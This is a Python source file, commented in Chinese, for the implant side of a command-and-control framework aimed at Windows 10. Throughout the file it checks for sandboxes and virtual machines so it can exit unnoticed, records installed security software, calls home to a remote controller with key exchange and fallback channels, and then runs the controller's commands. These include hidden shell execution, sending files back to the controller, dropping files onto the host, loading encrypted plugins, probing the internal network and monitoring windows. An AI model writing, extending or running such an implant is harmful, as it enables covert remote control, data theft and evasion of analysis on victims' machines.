"""
C2 Agent (受控端) - 运行在 Windows 10
主入口：环境检测 → 环境感知 → 密钥交换 → 通信 → 指令执行循环
"""
import sys
import os
import time
import json
import logging
import platform
import subprocess
import threading
from concurrent.futures import ThreadPoolExecutor

# 项目根目录加入 path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from shared.crypto import CryptoEngine, serialize_message, deserialize_message
from shared.protocol import (
    Protocol, MSG_CMD, MSG_RESULT, MSG_HEARTBEAT,
    MSG_KEY_EXCHANGE, MSG_REGISTER, CMD_EXEC, CMD_DOWNLOAD,
    CMD_UPLOAD, CMD_SYSINFO, CMD_MODULES, CMD_EXIT, CMD_SHELL,
    CMD_LOAD_MODULE, CMD_RUN_MODULE, CMD_NETPROBE, CMD_WINMON,
)
from agent.sandbox_detect import SandboxDetector
from agent.env_perception import EnvPerception
from agent.module_loader import install_finder, load_plugin_direct
from agent.comm_channels import ChannelManager
from agent.frag_transfer import Fragmenter

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)s %(name)s: %(message)s",
)
logger = logging.getLogger("agent")


class Agent:
    """C2 Agent 主类"""

    def __init__(self, controller_host: str, controller_port: int = 9999):
        self.controller_host = controller_host
        self.controller_port = controller_port
        self.crypto = CryptoEngine()
        self.session_id = Protocol.new_session_id()
        self.env_profile = None
        self.channel_mgr = None
        self.running = False
        self.loaded_modules = {}

        # 插件目录
        self.plugin_dir = os.path.join(os.path.dirname(__file__), "plugins")

        # 插件专用密钥（pack_plugin.py 生成的 AES 密钥）
        self.plugin_crypto = CryptoEngine()
        self._load_plugin_key()

    def _load_plugin_key(self):
        """从 key.txt 加载插件加密密钥"""
        key_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "key.txt")
        if os.path.exists(key_path):
            with open(key_path, "r") as f:
                key_hex = f.read().strip()
            self.plugin_crypto.session_key = bytes.fromhex(key_hex)
            logger.info("Plugin encryption key loaded from key.txt")
        else:
            logger.warning(f"Plugin key file not found: {key_path}")

    def run(self):
        """Agent 主流程"""
        logger.info(f"Agent starting, session: {self.session_id[:8]}...")

        # Step 1: 沙箱/VM/调试器检测
        logger.info("Phase 1: Sandbox/VM detection...")
        sandbox_result = SandboxDetector().run_all_checks()
        logger.info(f"Sandbox check: {sandbox_result['level']} "
                     f"(score={sandbox_result['risk_score']}/{sandbox_result['max_score']})")

        if sandbox_result["level"] == "sandbox":
            logger.warning("Sandbox detected! Performing decoy exit...")
            self._decoy_exit()
            return

        # Step 2: WMI 环境感知
        logger.info("Phase 2: Environment perception...")
        perception = EnvPerception()
        self.env_profile = perception.run()
        logger.info(f"Host: {self.env_profile.hostname}, "
                     f"OS: {self.env_profile.os_version}, "
                     f"Admin: {self.env_profile.is_admin}")
        logger.info(f"Security SW: {self.env_profile.security_software}")
        logger.info(f"Whitelist SW: {self.env_profile.whitelist_software}")

        # Step 3: 生成 RSA 密钥对
        logger.info("Phase 3: Generating RSA keypair...")
        self.crypto.generate_rsa_keypair()

        # Step 4: 建立通信
        logger.info("Phase 4: Establishing communication...")
        self.channel_mgr = ChannelManager(self.crypto, self.session_id)
        channel = self._connect_with_retry()
        if not channel:
            logger.error("Failed to connect to controller. Exiting.")
            return

        # Step 5: 密钥交换
        logger.info("Phase 5: Key exchange...")
        if not self._key_exchange(channel):
            logger.error("Key exchange failed. Exiting.")
            return

        # Step 6: 发送注册信息
        logger.info("Phase 6: Sending registration info...")
        self._send_registration(channel)

        # Step 7: 指令执行循环
        logger.info("Phase 7: Entering command loop...")
        self.running = True
        self._command_loop(channel)

    def _decoy_exit(self):
        """
        沙箱环境下的伪装退出
        表现为正常程序行为，不产生异常日志
        """
        logger.info("Performing benign exit...")
        # 模拟正常程序行为后退出
        time.sleep(2)
        try:
            # 正常退出，不留痕迹
            sys.exit(0)
        except SystemExit:
            os._exit(0)

    def _connect_with_retry(self, max_retries: int = 10, interval: float = 5.0):
        """带重试的连接建立"""
        for attempt in range(max_retries):
            logger.info(f"Connection attempt {attempt + 1}/{max_retries}...")
            channel = self.channel_mgr.connect_best(
                self.env_profile,
                host=self.controller_host,
                port=self.controller_port,
                target_email="",
                shared_path="",
            )
            if channel:
                return channel
            time.sleep(interval)
        return None

    def _key_exchange(self, channel) -> bool:
        """密钥交换：接收 Controller 公钥，发送 Agent 公钥"""
        try:
            # Step 1: 接收 Controller 发送的公钥（未加密的 key_exchange 消息）
            logger.info("Waiting for controller public key...")
            if hasattr(channel, 'sock') and channel.sock:
                channel.sock.settimeout(15)
                length_data = self._recv_exact(channel.sock, 4)
                if not length_data:
                    logger.error("Failed to read key exchange length")
                    return False
                import struct as _struct
                length = _struct.unpack("!I", length_data)[0]
                body = self._recv_exact(channel.sock, length)
                if not body:
                    logger.error("Failed to read key exchange body")
                    return False
                raw_msg, _ = deserialize_message(length_data + body)
                msg_type = raw_msg["header"].get("type", "")

                if msg_type == MSG_KEY_EXCHANGE:
                    controller_pub = raw_msg["payload"]
                    self.crypto.load_rsa_public(controller_pub)
                    logger.info("Received controller public key")
                else:
                    # 不是密钥交换消息，可能是普通加密消息
                    # 尝试解密
                    plaintext = self.crypto.decrypt_message(raw_msg)
                    logger.warning(f"Expected key_exchange, got {msg_type}")
                    return False

            # Step 2: 发送 Agent 公钥给 Controller
            agent_pub = self.crypto.get_public_key_pem()
            msg = {
                "header": {
                    "session_id": self.session_id,
                    "seq": 0,
                    "timestamp": time.time(),
                    "channel": "tcp",
                    "type": MSG_KEY_EXCHANGE,
                },
                "encrypted_key": b"",
                "nonce": b"",
                "payload": agent_pub,
                "tag": b"",
            }
            wire = serialize_message(msg)
            if hasattr(channel, 'sock') and channel.sock:
                channel.sock.sendall(wire)
                logger.info("Sent agent public key to controller")

            logger.info("Key exchange completed")
            return True

        except Exception as e:
            logger.error(f"Key exchange error: {e}")
            return False

    @staticmethod
    def _recv_exact(sock, n: int):
        """精确接收 n 字节"""
        data = b""
        while len(data) < n:
            chunk = sock.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
        return data

    def _send_registration(self, channel):
        """发送 Agent 注册信息"""
        info = {
            "session_id": self.session_id,
            "hostname": self.env_profile.hostname,
            "username": self.env_profile.username,
            "os": self.env_profile.os_version,
            "arch": self.env_profile.arch,
            "admin": self.env_profile.is_admin,
            "security_sw": self.env_profile.security_software,
            "whitelist_sw": self.env_profile.whitelist_software,
        }
        data = Protocol.build_register_info(info)
        # 通过加密通道发送
        encrypted = self.crypto.encrypt_message(
            data, self.session_id, channel="tcp", msg_type=MSG_REGISTER
        )
        wire = serialize_message(encrypted)
        if hasattr(channel, 'sock') and channel.sock:
            channel.sock.sendall(wire)

    def _command_loop(self, channel):
        """指令执行主循环（含心跳保活和通道自动切换）"""
        if hasattr(channel, 'sock') and channel.sock:
            channel.sock.settimeout(10)

        self._last_msg_time = time.time()
        self._heartbeat_interval = 15
        self._heartbeat_timeout = 45
        self._current_channel = channel
        self._result_lock = threading.Lock()

        # 线程池：支持并发执行指令
        executor = ThreadPoolExecutor(max_workers=4, thread_name_prefix="cmd")

        # 启动心跳线程
        hb_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
        hb_thread.start()

        while self.running:
            try:
                data = channel.recv()
                if data is None:
                    # 超时，检查是否超过心跳超时
                    if time.time() - self._last_msg_time > self._heartbeat_timeout:
                        logger.warning("Heartbeat timeout, connection may be dead")
                        raise ConnectionError("Heartbeat timeout")
                    continue

                self._last_msg_time = time.time()

                cmd = Protocol.parse_command(data)
                cmd_type = cmd.get("command")
                cmd_args = cmd.get("args", {})

                # 心跳响应直接跳过
                if cmd_type == "heartbeat_ack":
                    continue

                logger.info(f"Received command: {cmd_type}")

                # 并发执行指令（非阻塞）
                if cmd_type == CMD_EXIT:
                    result = self._execute_command(cmd_type, cmd_args)
                    self._send_result(channel, cmd_type, result)
                    self.running = False
                else:
                    request_id = cmd_args.pop("__request_id__", None)
                    executor.submit(
                        self._exec_and_send, channel, cmd_type, cmd_args, request_id
                    )

            except (ConnectionResetError, BrokenPipeError, OSError, ConnectionError) as e:
                logger.warning(f"Connection lost: {e}")
                channel = self._switch_channel()
                if not channel:
                    logger.error("All channels failed. Exiting.")
                    break
                self._last_msg_time = time.time()
                logger.info("Reconnected via channel switch")
            except Exception as e:
                logger.error(f"Command loop error: {e}")
                time.sleep(1)

        channel.close()

    def _heartbeat_loop(self):
        """心跳发送线程"""
        while self.running:
            time.sleep(self._heartbeat_interval)
            try:
                hb = Protocol.build_heartbeat()
                self._current_channel.send(hb, MSG_HEARTBEAT)
            except Exception:
                pass  # 发送失败由主循环检测

    def _switch_channel(self) :
        """断线后切换到备用通道"""
        failed_type = getattr(self._current_channel, 'name', '')
        logger.info(f"Switching away from failed channel: {failed_type}")
        try:
            self._current_channel.close()
        except Exception:
            pass

        time.sleep(3)

        channel = self.channel_mgr.connect_best_excluding(
            self.env_profile,
            exclude=[failed_type],
            host=self.controller_host,
            port=self.controller_port,
            target_email="",
            shared_path="",
        )
        if not channel:
            return None

        # 密钥交换 + 注册
        if not self._key_exchange(channel):
            return None
        if hasattr(channel, 'sock') and channel.sock:
            channel.sock.settimeout(10)
        self._send_registration(channel)
        self._current_channel = channel
        return channel

    # ── 分片发送 ──────────────────────────────────────────

    FRAG_THRESHOLD = 8192  # 超过 8KB 自动分片

    def _send_result(self, channel, cmd_type: str, result: bytes):
        """发送执行结果，大数据自动分片传输（发送节流，依赖 TCP 流控）"""
        if len(result) <= self.FRAG_THRESHOLD:
            channel.send(result, MSG_RESULT)
            return

        fragmenter = Fragmenter(chunk_size=self.FRAG_THRESHOLD)
        fragments = fragmenter.fragment(result)
        logger.info(f"Large result ({len(result)} bytes), sending in {len(fragments)} fragments")

        for i, frag in enumerate(fragments):
            frag_args = {
                "__frag__": {
                    "transfer_id": frag["transfer_id"],
                    "chunk_index": frag["chunk_index"],
                    "total_chunks": frag["total_chunks"],
                    "total_size": frag["total_size"],
                    "checksum": frag["checksum"],
                }
            }
            import base64
            frag_data_b64 = base64.b64encode(frag["data"]).decode("ascii")
            frag_args["__frag_data__"] = frag_data_b64

            frag_payload = Protocol.build_command(cmd_type, frag_args)

            # TCP 流控：等待发送缓冲区排空后再发下一片
            if hasattr(channel, 'sock') and channel.sock:
                import select
                while True:
                    _, writable, _ = select.select([], [channel.sock], [], 5.0)
                    if writable:
                        break
                    time.sleep(0.1)

            channel.send(frag_payload, MSG_RESULT)
            # 发送节流：每片间隔，给接收端处理时间
            if i < len(fragments) - 1:
                time.sleep(0.3)

    def _exec_and_send(self, channel, cmd_type: str, args: dict, request_id: str = None):
        """在线程池中执行指令并发送结果（线程安全）"""
        try:
            result = self._execute_command(cmd_type, args)
            with self._result_lock:
                self._send_result(channel, cmd_type, result)
        except Exception as e:
            logger.error(f"Concurrent command {cmd_type} failed: {e}")
            err = Protocol.build_result("error", "", str(e))
            with self._result_lock:
                self._send_result(channel, cmd_type, err)

    def _execute_command(self, cmd_type: str, args: dict) -> bytes:
        """执行指令并返回结果"""
        try:
            if cmd_type == CMD_EXEC:
                return self._cmd_exec(args)
            elif cmd_type == CMD_SYSINFO:
                return self._cmd_sysinfo()
            elif cmd_type == CMD_DOWNLOAD:
                return self._cmd_download(args)
            elif cmd_type == CMD_UPLOAD:
                return self._cmd_upload(args)
            elif cmd_type == CMD_MODULES:
                return self._cmd_list_modules()
            elif cmd_type == CMD_LOAD_MODULE:
                return self._cmd_load_module(args)
            elif cmd_type == CMD_RUN_MODULE:
                return self._cmd_run_module(args)
            elif cmd_type == CMD_NETPROBE:
                return self._cmd_netprobe(args)
            elif cmd_type == CMD_WINMON:
                return self._cmd_winmon(args)
            elif cmd_type == CMD_EXIT:
                return Protocol.build_result("ok", "Agent shutting down.")
            else:
                return Protocol.build_result("error", "", f"Unknown command: {cmd_type}")
        except Exception as e:
            return Protocol.build_result("error", "", str(e))

    def _cmd_exec(self, args: dict) -> bytes:
        """执行系统命令"""
        cmd = args.get("cmd", "")
        if not cmd:
            return Protocol.build_result("error", "", "No command specified")

        try:
            result = subprocess.run(
                cmd, shell=True,
                capture_output=True, text=True,
                timeout=30,
                creationflags=0x08000000  # CREATE_NO_WINDOW
            )
            output = result.stdout
            if result.stderr:
                output += f"\n[stderr]\n{result.stderr}"
            return Protocol.build_result("ok", output)
        except subprocess.TimeoutExpired:
            return Protocol.build_result("error", "", "Command timed out (30s)")
        except Exception as e:
            return Protocol.build_result("error", "", str(e))

    def _cmd_sysinfo(self) -> bytes:
        """返回系统信息"""
        if self.env_profile:
            info = json.dumps(self.env_profile.to_dict(), indent=2, ensure_ascii=False)
        else:
            info = f"Hostname: {platform.node()}\nOS: {platform.platform()}"
        return Protocol.build_result("ok", info)

    def _cmd_download(self, args: dict) -> bytes:
        """从 Agent 传输文件到 Controller"""
        path = args.get("path", "")
        if not path or not os.path.exists(path):
            return Protocol.build_result("error", "", f"File not found: {path}")

        try:
            import base64
            with open(path, "rb") as f:
                data = f.read()
            encoded = base64.b64encode(data).decode("ascii")
            filename = os.path.basename(path)
            result_data = json.dumps({
                "filename": filename,
                "size": len(data),
                "data": encoded,
            })
            return Protocol.build_result("ok", result_data)
        except Exception as e:
            return Protocol.build_result("error", "", str(e))

    def _cmd_upload(self, args: dict) -> bytes:
        """从 Controller 传输文件到 Agent"""
        filename = args.get("filename", "")
        data_b64 = args.get("data", "")

        if not filename or not data_b64:
            return Protocol.build_result("error", "", "Missing filename or data")

        try:
            import base64
            data = base64.b64decode(data_b64)
            save_path = os.path.join(os.environ.get("TEMP", "."), filename)
            with open(save_path, "wb") as f:
                f.write(data)
            return Protocol.build_result("ok", f"File saved to: {save_path}")
        except Exception as e:
            return Protocol.build_result("error", "", str(e))

    def _cmd_list_modules(self) -> bytes:
        """列出已加载模块"""
        modules = list(self.loaded_modules.keys())
        info = json.dumps({
            "loaded_modules": modules,
            "plugin_dir": self.plugin_dir,
            "available": self._list_available_plugins(),
        }, indent=2)
        return Protocol.build_result("ok", info)

    def _list_available_plugins(self) -> list:
        """列出可用的加密插件"""
        if not os.path.exists(self.plugin_dir):
            return []
        return [
            f.replace(".enc", "")
            for f in os.listdir(self.plugin_dir)
            if f.endswith(".enc")
        ]

    def _cmd_load_module(self, args: dict) -> bytes:
        """加载指定插件模块"""
        module_name = args.get("name", "")
        if not module_name:
            return Protocol.build_result("error", "", "Missing module name")

        try:
            module = load_plugin_direct(self.plugin_dir, module_name, self.plugin_crypto)
            self.loaded_modules[module_name] = module
            return Protocol.build_result("ok", f"Module '{module_name}' loaded successfully")
        except Exception as e:
            return Protocol.build_result("error", "", f"Load failed: {e}")

    def _cmd_run_module(self, args: dict) -> bytes:
        """执行已加载模块的 run() 函数"""
        module_name = args.get("name", "")
        if not module_name:
            return Protocol.build_result("error", "", "Usage: run_mod <module_name> [key=val ...]")

        if module_name not in self.loaded_modules:
            return Protocol.build_result("error", "", f"Module '{module_name}' not loaded. Use 'load_mod {module_name}' first.")

        module = self.loaded_modules[module_name]
        if not hasattr(module, "run") or not callable(module.run):
            return Protocol.build_result("error", "", f"Module '{module_name}' has no run() function")

        try:
            # 将 args 中除 name 外的参数传给 run()
            run_kwargs = {k: v for k, v in args.items() if k != "name"}
            output = module.run(**run_kwargs)
            return Protocol.build_result("ok", json.dumps(output, indent=2, ensure_ascii=False) if isinstance(output, (dict, list)) else str(output))
        except Exception as e:
            return Protocol.build_result("error", "", f"Module execution failed: {e}")

    def _cmd_netprobe(self, args: dict) -> bytes:
        """内网横向探测（拓展功能）"""
        try:
            subnet = args.get("subnet", None)
            # 直接导入插件模块执行（不走加密加载，因为插件可能是明文 .py）
            try:
                from agent.plugins.netprobe import run as netprobe_run
            except ImportError:
                module = load_plugin_direct(self.plugin_dir, "netprobe", self.plugin_crypto)
                netprobe_run = module.run
            result = netprobe_run(subnet=subnet)
            return Protocol.build_result("ok", json.dumps(result, indent=2, ensure_ascii=False))
        except Exception as e:
            return Protocol.build_result("error", "", str(e))

    def _cmd_winmon(self, args: dict) -> bytes:
        """窗口信息采集（拓展功能）"""
        try:
            duration = args.get("duration", 30)
            try:
                from agent.plugins.winmon import run as winmon_run
            except ImportError:
                module = load_plugin_direct(self.plugin_dir, "winmon", self.plugin_crypto)
                winmon_run = module.run
            result = winmon_run(duration=duration)
            return Protocol.build_result("ok", json.dumps(result, indent=2, ensure_ascii=False))
        except Exception as e:
            return Protocol.build_result("error", "", str(e))


def main():
    import argparse
    parser = argparse.ArgumentParser(description="C2 Agent")
    parser.add_argument("controller", help="Controller host:port")
    args = parser.parse_args()

    parts = args.controller.split(":")
    host = parts[0]
    port = int(parts[1]) if len(parts) > 1 else 9999

    agent = Agent(host, port)
    agent.run()


if __name__ == "__main__":
    main()
